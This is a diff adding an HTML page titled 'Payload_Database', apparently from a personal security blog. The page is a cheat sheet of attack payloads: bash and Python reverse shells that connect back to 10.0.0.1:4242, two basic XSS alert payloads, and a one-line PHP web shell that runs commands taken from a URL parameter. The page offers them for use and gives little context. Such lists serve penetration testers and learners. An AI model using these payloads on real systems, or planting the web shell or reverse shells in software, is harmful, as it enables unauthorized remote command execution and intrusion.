@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payloads | p0nther</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <header>
+        <a href="index.html" class="logo">p0nther</a>
+        <nav>
+            <a href="index.html">~/home</a>
+            <a href="#">~/writeups</a>
+            <a href="payloads.html">~/payloads</a>
+            <a href="#">~/about</a>
+        </nav>
+    </header>
+
+    <div class="container">
+        <h2 class="section-title">Payload_Database</h2>
+
+        <div class="post-content" style="max-width: 100%;">
+            <h3>Reverse Shells</h3>
+            <p>Bash TCP Reverse Shell</p>
+            <pre><code>bash -i >& /dev/tcp/10.0.0.1/4242 0>&1</code></pre>
+
+            <p>Python Reverse Shell</p>
+            <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+
+            <h3>XSS Payloads</h3>
+            <p>Basic Alert</p>
+            <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+            <p>Image OnError</p>
+            <pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+            <h3>PHP One-Liners</h3>
+            <p>Simple Web Shell</p>
+            <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 p0nther. All rights reserved. <br> <span style="color: var(--accent-color)">root@localhost</span>
+        </p>
+    </footer>
+</body>
+
+</html>
